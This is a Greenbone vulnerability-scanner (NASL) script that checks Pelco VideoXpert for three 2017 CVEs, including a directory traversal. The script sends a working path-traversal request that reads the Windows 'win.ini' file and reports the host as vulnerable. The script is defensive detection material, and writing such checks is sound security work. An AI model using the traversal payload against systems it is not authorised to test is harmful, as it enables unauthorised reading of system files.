# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:pelco:videoxpert";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106936");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2017-07-11 09:20:39 +0700 (Tue, 11 Jul 2017)");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2017-9964", "CVE-2017-9965", "CVE-2017-9966");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Pelco VideoXpert Multiple Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_pelco_videoxpert_detect.nasl");
  script_mandatory_keys("pelco_videoxpert/installed");

  script_tag(name:"summary", value:"Pelco VideoXpert is prone to multiple vulnerabilities:

  - Directory traversal vulnerability which allows unauthenticated attackers to read arbitrary files in the context
of the web server. (CVE-2017-9965)

  - Missing encryption of sensitive information. The software transmits sensitive data using double Base64 encoding
for the Cookie 'auth_token' in a communication channel that can be sniffed by unauthorized actors or arbitrarily
be read from the vxcore log file directly using directory traversal attack resulting in authentication bypass/
session hijacking. (CVE-2017-9964)

  - By replacing certain files, an authorized user can obtain system privileges and the inserted code would execute
at an elevated privilege level. (CVE-2017-9966)");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Update to version 2.1 or later.");

  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5419.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5420.php");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-17-355-02");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/portal//..\\\..\\\..\\\..\\\windows\win.ini";

if (http_vuln_check(port: port, url: url, pattern: "; for 16-bit app support", check_header: TRUE)) {
  report = "It was possible to obtain the 'win.ini' file through a path traversal exploit.";
  report += '\n\n' + http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
